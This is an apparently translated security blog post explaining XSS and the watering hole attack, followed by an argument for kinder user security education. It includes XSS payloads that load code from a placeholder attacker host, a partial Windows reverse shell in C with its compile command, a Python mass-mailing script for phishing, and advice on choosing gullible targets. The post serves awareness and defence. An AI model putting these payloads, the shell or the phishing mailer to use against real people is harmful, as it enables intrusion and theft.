---
layout: single
classes: wide
title:  " Client Side Attack - Watering Hole"
date:   2021-01-21 21:00:00
categories: attacks
header:
  teaser: "/assets/images/deadly_pond.jpg"
---

Password theft, bot-net creation, life on the internet has become a wild place. While our antiviruses and firewalls do protect us against the most basic automated attacks, they are generally much less effective at protecting us from ourselves ...
{: .text-justify}

![alt]({{ site.url }}{{ site.baseurl }}/assets/images/comics_0x0ff/0x0ffinfo_comics_reporter.png){: style="float: right; width: 200px; margin: 1em"}

Nowadays there are so many different ways to take control of machines remotely. Via **SQL injections** , **Remote File Inclusion ([RFI](https://fr.wikipedia.org/wiki/Remote_File_Inclusion))** or quite simply because certain servers, applications, equipment, devices give up free access to their system, protected only by a trivial password, or worse ";by default"; (_therefore found in product documentation_). These configuration vulnerabilities and weaknesses are generally looked for automatically by bot armies via "**\<Insert Search Engine Here\> dorking**" or scripts performing **scan** + **fingerprinting** (_identification of OS / applications and their version_).
{: .text-justify}

This article presents a glimpse of **client side** attacks (_**Client Side**_), which exploit our **OS** and application installed weaknesses. The peculiarity of these attacks are designed to make us pull the trigger ourselves, because yes, the main lever of this attack type is the users inadvertence and gullibility.
{: .text-justify}

**Warning:** Be aware this article is in no way intended to teach you how to cheap ass trap poor innocent Internet users, but rather to help you better understand what threatens you on the web… And what threatens even more non-offensive-security insiders unfamiliar with technical blogs... And if it helps you to better protect yourself against it, and better protect your loved ones or your company, then this article was not written for nothing.
{: .notice--warning}
{: .text-justify}

**Foreword:** This article has been held back for over **5 years**. It was originally written by **0x0c** and is one of those unfinished articles that I (_**0x0ff.info**_) will try to publish in the next few months.
{: .notice}
{: .text-justify}

# **CLIENT-SIDE ATTACK WHAT'S WHAT?**

![alt]({{ site.url }}{{ site.baseurl }}/assets/images/comics_0x0ff/0x0ffinfo_comics_behind.png){: style="float: left; width: 300px; margin: 1em"}

This attack variety operates directly on users'machines (_unlike "server side" attacks_(_[**SQLI**](https://fr.wikipedia.org/wiki/Injection_SQL#:~:text=La%20faille%20SQLi%2C%20abr%C3%A9viation%20de,avec%20une%20base%20de%20donn%C3%A9es.), [**RFI**](https://fr.wikipedia.org/wiki/Remote_File_Inclusion), etc._)) by taking advantage of low vigilance humans operating these terminals.
{: .text-justify}

Usually, this attack type attempts to exploit one or more software clients (_PDF reader, text editor, internet browser, Java environment, etc._) flaws (_or known as "features" lol_) in order to obtain sensitive information (_cookies, identifiers, credit card number, etc._) or to take control of infected workstations.
{: .text-justify}

The attack range in companies and outside these companies is very, very wide due to the many OS and software installed varieties on the terminals (_workstations, personal computers, smartphones, connected objects, etc._) and what's more in different versions from one device to another!
{: .text-justify}

In order to operate these attacks usually need that the users carry out an action on their system or their application "in a legitimate way" (_legitimate from the point of view of the system, the anti-virus and other means of prevention installed on the workstation._), for example activate the macros of an Excel file. To do so, it seeks to exploit the credulity of humans behind the machines, therefore it is quite difficult to protect themselves effectively with purely technically automated means... Therefore benevolent education is ,in order to effectively reduce the impact of this attack type,needed for lay users.
{: .text-justify}

In this article we will present the construction of a so-called "Watering Hole Attack". But first, it is absolutely necessary to understand what vulnerabilities are called **XSS** (_**C**ross **S**ite **S**cripting_). This will therefore be the subject of the next chapter.
{: .text-justify}

# **WHAT IS XSS?**

**Note:** If you are already aware of this subject, you can skip this chapter completely.
{: notice--warning}
{: .text-justify}

Hard to believe that it is the first time that we have really talked about **XSS** on this blog because these attack kinds are offensive security's 101. Hence why, when beginning to study the subject or when we usually start the challenges and **CTF** on sites like [www.newbiecontest.org](http://www.newbiecontest.org/) , [root-me.org](http://root-me.org/) , [www.hackthebox.eu](http://www.hackthebox.eu/) , we almost always start by digging the **SQL injections** and **XSS flaws**.
{: .text-justify}

It is a matter here of briefly presenting the basic principle of these vulnerabilities, so that the article is sufficient in itself in terms of content (_the subject is thoroughly treated, on all internets, and you can find more or less detailed technical presentations on just about any site talking about offensive security_).
{: .text-justify}

In this quick presentation, we are going to focus exclusively on the most common **XSS JavaScript** flaws.
{: .text-justify}

There are two types of **XSS** flaw:

- **Stored XSS:** which is a flaw that will be stored permanently on the server,
- **XSS on the fly:** which can only be done through an Input client (_HTTP GET, HTTP POST, etc._).

As we will see, these two flaws have exactly the same origin: vulnerable page code to users' input bad handling.
{: .text-justify}

### **THE STORED XSS**

It can be done when a site stores and displays data entered by one or more customers. This is for example the case of forums which allow multiple users to comment.
{: .text-justify}

If the web application does not correctly process the requests sent by the users, then it becomes possible to divert the initial use by integrating a piece of code into a workstation.
{: .text-justify}

For example by typing as a message:
{: .text-justify}

{% highlight javascript %}
<script>alert("There you go!")</script>
{% endhighlight %}

![alt]({{ site.url }}{{ site.baseurl }}/assets/images/posts_img/XSS_example1.png){: style="margin: 1em"}

The real attacker objective, being to take control of your station, rather than displaying a message "for the _lolz_" , he will instead try to use a module of his own by exploiting a vulnerability in your browser, or a key exploit. Practically talking through **BeEF** , **autopwn** or **metasploit** :

{% highlight javascript %}
<img src = "//<pirate_domain>/autopwn" border='0'width='1' height='1'>
{% endhighlight %}

The countermeasure to this attack type is unfortunately the site's owner's sole responsibility. To him, it will be a question of ensuring that all user inputs are properly cleaned, by filtering each client sent data in order to detect and deactivate any code that an attacker would attempt to inject. _You can refer to the_ [_OWASP site_](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet)_for this._
{: .text-justify}

### **XSS ON THE FLY**

Now suppose that your site does not store customer data, but that on the other hand user inputs are (_and rather badly_) processed by(_usually_ _ **JavaScript** _) client-side code .
{: .text-justify}

For example, imagine the following code, indicating that the none existing page:
{: .text-justify}

{% highlight php %}
<?php echo "Page ".urldecode($_SERVER[REQUEST_URI])."Not Found"; ?>
{% endhighlight %}

Well, it will be quite possible to put a malware wrapped in an **HTML img tag** directly in the **URL** in a **link**:
{: .text-justify}

{% highlight javascript %}
http://<domain_leggit_but_vulnerable>/Vous allez être redirigé, veuillez patienter...<img src='//<domaine_pirate>/autopwn' border='0' height='1' width='1'> <script>setTimeout(function(){top.location="//forum/"},5000);</script>
{% endhighlight %}

**User side:**

![alt]({{ site.url }}{{ site.baseurl }}/assets/images/posts_img/XSS_flight1.png){: style="margin: 1em"}

So obviously we will only have a load on the somewhat _ **dodgy URL**: **http://<site_vulnerable>/Vous%20allez…**, but it is still possible to hide the link address using a site such as [bitly.com](https://bitly.com/) or whatever… And once the malware loads on the client side, well… you're done.
{: .text-justify}

The problematic countermeasure is shared for once. Of course, like **Stored XSS**, it is the vulnerable site owner's responsibility to ensure that all user input content is properly checked before use. But it is also everyone's responsibility to check what the links point to and not immediately click on any content that seems questionable, received by email or posted on a forum or social network. - _You can refer to the [OWASP site](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet) for that._
{: .text-justify}

# **ANATOMY OF A WATERING HOLE**

Rather than a long speech, let's take a look at a **concrete** case that will give you a better idea of ​​the slyness of this attack type. Let me introduce you to the so called "**Watering Hole**" technique, which is divided into three phases:
{: .text-justify}

1. **Identification of the target:** maximizing the quality of the attack and the quantity of targets being the primary goal, the preliminary phase will consist in studying and learning the internet uses of the more or less large population who will be the target of the attack.
2. **The creation of a ";water point";:** the water point is the booby trapped page (_generally via the exploitation of an **XSS** vuln_) which will allow the hacker to attack his victims thanks to the malicious code injection vulnerability. This page usually contains the content sought by the targeted victims in order to avoid any suspicion.
3. **Fishing:** this step consists of creating and baiting potential victims via various vectors (_emails, fake advertising banners, link on a forum, post on a social network, etc._). For example, if the conspirators are the attack targets, then it could be an email with the hooking title such as "**FINALLY! EVERYTHING IS REVEALED! THE GOVERNMENT LIED US ABOUT…**".

The success of such an attack is determined by the following equation:
{: .text-justify}

{% highlight tcl %}
[number of potential targets]

x [ratio of use by these users of the targeted vulnerable application (s)]

x [stealth ratio]

x [attractiveness ratio]
____________________________________________________________________________
= [number of victims]
{% endhighlight %}

So to carry out this attack type successfully, it is necessary to maximize each of these parameters, so good **R&D** is the key:
{: .text-justify}

**Target identification:**

The more carefully this phase is carried out, the more effective the attack will be. The goal of the attacker is to target more success in potential victims terminal attacks. Because yes, generally only a small percentage of the targeted population will actually access the trapped page, and only a fraction of these accesses will be through the vulnerable application on which the attack is based.
{: .text-justify}

The data collected will for example be:
{: .text-justify}

- **Interests:** identifying the sociological portrait of the target is an excellent way to maximize the number of clicks. Who are they, what are their centers of interest, what is their level of technical competence, what is their level of vigilance (_very low for conspirators, very easy target in this case_).
- **Means of communication:** which sites are usually consulted, which social networks are used, is email a relevant vector, etc. So many questions that make it possible to target the targeted population a little better.
- **Technical means used:** if the attacker is able to identify the applications and **OS** used by the targeted population then he will not need to spread himself over the development of several technical attacks targeting several applications in several versions. If it is difficult to identify technical habits in the private context (_if we take the theme of our targets: conspirators_), it is generally quite simple to identify the systems and software versions used within a company. … For example.

It is quite conceivable that a preliminary step would be to retrieve email lists, by dumping a **SQL database** from a forum (_which will be imagined for the illustration, pro Raoultien anti-vaccine den_).
{: .text-justify}

**Creation of a "water point":**

The trapped page generally exploits an **XSS** vuln, and is if possible hosted on a legitimate site that has been hijacked by the attacker (_**dailyXY.fr** for example_). Otherwise, the page for performing the attack will be hosted on a site owned by the attacker will probably taken care to acquire a credible domain name (_**journalXY.tf** for example, a little flag but still effective_).
{: .text-justify}

![alt]({{ site.url }}{{ site.baseurl }}/assets/images/comics_0x0ff/0x0ffinfo_comics_watering_hole.png){: style="margin: 1em"}


This page will contain the malicious code necessary to retrieve certain information (_cookies, passwords, credit card number, etc._) or even load malware directly onto the client workstation (_if the vulnerability exploited gave rise to an [RCE](https://en.wikipedia.org/wiki/Arbitrary_code_execution)_), which will give the attacker permanent access and full control of the victim's machine (_possibly transforming the infected PC into one of the zombies of a Botnet_).
{: .text-justify}

If **RCE** is operated then the program can be a simple **shell reverse** in **C** as this one (_thank you to the [**OSCP**](https://www.offensive-security.com/information-security-certifications/oscp-offensive-security-certified-professional/) for this example just perfect_)
{: .text-justify}

{% highlight c %}
/******** Var **********/
WSADATA wsaData;
SOCKET server;
struct hostent *host1;
struct sockaddr_in hax;
STARTUPINFO ini_process;
PROCESS_INFORMATION info_process;

int main(int count, char **args)
{
WSAStartup(MAKEWORD(2,2), &wsaData);
SOCKET Winsock;
char hostname[17]="mon.IP";
int portnum=80;

/***
[...] Configuration de la Socket avec WSASocket
***/
/** Connexion de la socket ***/
WSAConnect(Winsock,(SOCKADDR*)&hax,sizeof(hax),NULL,NULL,NULL,NULL);
/** Execution du shell ***/
memset(&ini_process,0,sizeof(ini_process));
ini_process.cb=sizeof(ini_process);
ini_process.dwFlags=STARTF_USESTDHANDLES;
ini_process.hStdInput= ini_process.hStdOutput = ini_process.hStdError = (HANDLE)Winsock;
CreateProcess(NULL,"cmd.exe",NULL,NULL,TRUE,CREATE_NO_WINDOW,NULL,NULL,&ini_process,&info_process);
return 0;
}
{% endhighlight %}


Compiled as:
{: .text-justify}

{% highlight c %}
#> i586-mingw-gcc -o /var/www/winini.exe malware.c -lws2_32
{% endhighlight %}


And the wider the scope of vulnerable applications integrated into the attack, the higher the number of potential victims. For example, let's say that the targets are the conspiratorial populations browsing only the versions of **Google Chrome** version **x.b.12345** to **y.t.1337** on **Windows**, are therefore excluded all **MAC**, **Linux**, **Firefox**, **Smartphone** users, etc.
{: .text-justify}

By digging a little into the current **tools** and **frameworks** (_**metasploit**, **SE-Toolkit**, **BEEF XSS**, **autopwn**, etc._) we quickly realize that a **LOT!** many things are possible, and without necessarily great expertise ...
{: .text-justify}

Stealth is also an essential factor, and this is again where technical quality makes the difference. The more well thought out and well hidden the attack, the less the user will suspect that there is something fishy and the less the attacked system and applications will try to defend itself. This is why finding a real vulnerable official site is generally a efficiency guarantee.
{: .text-justify}


**warning:** good examples of stealth and obfuscation can be found in the study of ransomware-type attacks which are often based on sending an office document (_**.docx**, **.xlsx**, **.pdf**, etc._) by email, containing macros. This code is generally obfuscated (_see_ [_Impenetrable Code_](https://fr.wikipedia.org/wiki/Code_imp%C3%A9n%C3%A9trable)) to trick **anti-virus** and other security solutions, and usually only includes two things: a custom encryption / decryption function and a download function for an encrypted malicious **payload** (_custom_). When the document is opened and the macro is used, the document gets the **payload** , decrypts it on reception and executes the attack program thus recovered.
{: .notice--warning}
{: .text-justify}

But for the watering hole to be successful, technique is not enough. It is absolutely necessary to provide a credible page that will not arouse suspicion. The best is to generate a positive but non-striking reaction so that the user forgets having accessed the page as quickly as possible and does not share it .
{: .text-justify}

In the case of our conspirators it could be a random text explaining why **5G** is a technology bought from the galactic federation of the green man Oriana (_[french meme real conspiratorial celebrity](https://s.kym-cdn.com/memes/people/sylvain-durif)_). The conspirator will likely adhere to the text (_decreasing his vigilance_) and move on in search of other truths to consume.
{: .text-justify}

It may seem counterintuitive, but it is probably not very effective to make the victim want to share the page, because if on the one hand the number of targets increases slightly, the risk that the attack is detected. explode! It only takes one person to uncover the rosebud for the deception to be exposed.
{: .text-justify}

**Fishing :**

Unlike phishing attacks where the targets or preys are random, in the case of a water point attack we will rather speak of **spear phishing** or targeted phishing.
{: .text-justify}

A successful fishery depends on two main factors:
{: .text-justify}

- **Number of targets:** These attacks generally cast a wide net, favoring quantity over quality. The simultaneous use of several vectors is generally an effective way to target a large number of people (_social networks, emails, forums, etc._). Indeed the lifespan of this attack type is generally short, from a few hours to a few days, it is therefore necessary to quickie massively target,
- **Engagement:** it is necessary to make people want to click. The more convincing and relevant the bait is to the prey, the less doubts the user will have. By staying within the theme of a conspiratorial target, it is safe to assume that these people will be inclined to click on links promising a big revelation about the machinations of the Illuminati reptilian government,
- **Mimicry and credibility:** like the water point, the email must appear appropriate. This can be done by copying the headers and the formalist of a newsletter from a legitimate site (_mimicry_). Or if the mail claims to be sent by a person, it will resume the tone expected by the spoofed sender, the language tics, abbreviations or possible emojis.

Of course all this is often scripted, automated, industrialized (_for example in Python_):
{: .text-justify}

{% highlight python %}
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import getpass
import time

# Identifiant du serveur SMTP
user=raw_input("\nUser :")
# Mot de passe du serveur SMTP
password= getpass.getpass("\nPassword : ")
# Variables du mail
mail_from ="anonymous@1337.com"
mail_to = "target@test.com"
mail_subject = "test 0x0ff"
file_body="mon_email.html"
# Header du mail
msg = MIMEMultipart('alternative')
msg['Subject'] = mail_subject
msg['From'] = mail_from
msg.set_unixfrom("From "+mail_from+" "+time.asctime(time.localtime())) 
# Création du corps du mail (plain-text/HTML)
body="" 
fp = open(file_body,'r')
for line in fp:
 body = body+line
fp.close()
# Authentification
s = smtplib.SMTP('mail_server.com:587')  
s.ehlo("anonymous")
s.starttls()
s.login(usr, password)
part = MIMEText(body, mail_type)
msg.attach(part)    
msg['To'] = mail_to
# Envoi du mail
s.sendmail(mail_from, mail_to, msg.as_string())
s.quit()
{% endhighlight %}

## **ALL TO SAY WHAT?**

Well all to say that, even if there are technical protection measures, **safety is everyone's business**. From website developer to user, including the teams in charge of their companies'**IS** , and of course security teams.
{: .text-justify}

Risk awareness and **IT** security education are among the keys to securing our personal and business networks and equipment. And this education can not be done only by **IT** professionals.
{: .text-justify}

It is obvious that the education of technical teams in the offensive realities is very beneficial. And we can hope that it leads to a consequent reduction in the attack surface(_technical_) thanks to the application of good practices understood by the designer (_and not just applied to pass any validation_). But we must not neglect the importance of an educated user base involved in IT security which is just as desirable, allowing to significantly reduce the impact of **client-side** attacks , **phishing** and even **social engineering**.
{: .text-justify}

Unfortunately, this education today is only carried out in the professional field (_and still not everywhere_), whereas it could be done all over the place (_in schools, in private and family circles, as well as in the public domain. , by the government, etc._). Contrary to what has been done over the past 20 years (_we will recall the_ [_Krash.in_](https://reflets.info/articles/la-justice-des-bots-c-est-maintenant)_affair in which a blogger was condemned for the sole purpose of educating people through his blog_), it is not by trying to prohibit the spread of knowledge in computer security that we effectively protect Internet users. On the contrary, the lack of visibility and the apparent ultra confidential nature of our domains (_from the point of view of the general public_) is most certainly partly responsible for the carelessness of Internet users ... This is why it seems to me beneficial to quickly offer popularized access to this culture and this knowledge, and I hope (_in vain?_) that the democratization of this knowledge will increase the level of involvement and vigilance in general.
{: .text-justify}

As for the method of transmission, I cannot help expressing a very critical opinion on the reality that I observe. This type of awareness (_in the workplace_) is often seen as a chore, or even an insult. And my gosh, it's all our fault. Let's get off our high horse, we security professionals. Popularization is desirable and learning is not done with 4 powerpoint slides and a bloated **QCM** to be completed each year, it is in-depth work. As such, it must be pleasant for the recipient of these teachings, because otherwise he picks up. Even by pointing the user, this exchange will probably be counterproductive, and the person may become actively refractory, out of a spirit of contradiction.
{: .text-justify}

To be effective, it is therefore necessary to be benevolent in our approach, and it is also essential to adapt the speech to the audience. Because we have to get used to the idea that this awareness could not be so extensive for everyone. So let's adapt our speeches to the audience. Each group: your parents, your children, technical teams, managers or users of a company **IS** in need to be treated independently on the content of these exchanges. The form must remain attractive and pleasant. It is by offering support in this progression that we will act most effectively on the global level. It is by involving and empowering users more than by constraining their uses that mentalities will evolve.
{: .text-justify}

So, if you are part of an **SEC** team , I ask you the question, have you ever thought about your methods? Are you sure you never fall into the abuse of authority or into a self-indulgent bias? Do you not sometimes, unconsciously, adopt a posture of guardian of morals and knowledge? Are you sure you are not being paternalistic and condescending in your communication? Don't you infantilize your users " _unable to use their own tools with these big twats_"? In short, are you really convinced that the vertical tutor/pupil relationship is the best method?
{: .text-justify}

Personally, I am convinced that there is unease today ... Let us not be imbued with ourselves or too proud of our methods, because we are probably responsible (_at least partially_) for the epidermal reactions that computer security triggers in some ... Rightly and wrongly , we are seen by some as a somewhat sectarian and arrogant bunch of bullies ...
{: .text-justify}

And yet the observation is clear, the failure is bitter and there is nothing to brag about. Today, more than 20 years after the advent of the Internet for the general public, users still do not have good hygiene in using the computer tool. Worse, not all **IT** professionals have this veneer of knowledge. And how can they fight against the multitude of attacks when they are not able to identify the weapons that are opposed to them?.. Of course these principles are not necessarily taught in schools and universities (_when security is is not the subject of the training_) which is a definite lack, however we can also be singled out, because after all we may not have paddled in the right direction.
{: .text-justify}

Fortunately the trend has turned a bit on the side of **IT** professionals. Hacking and **DIY** are on the rise, offensive security has also become more accessible. Our community has grown and opened up, becoming welcoming and engaging. So a big thank you to the French actors who have made and still make this knowledge accessible: [www.newbiecontest.org](http://www.newbiecontest.org/), [root-me.org](http://root-me.org/), [La nuit du Hack](https://nuitduhack.com/), [LeHack](https://lehack.org/fr), [hackndo.com](https://beta.hackndo.com/) , [grehack.fr](https://grehack.fr/) , [reflets.info](https://reflets.info/) , [SebSauvage](https://sebsauvage.net/) , [La Quadrature du Net](https://www.laquadrature.net/), [Kali Linux Fr](https://www.kali-linux.fr/), …_I invite you to complete this list of tens (hundreds?) of links, I will update the article accordingly if you like._
{: .text-justify}

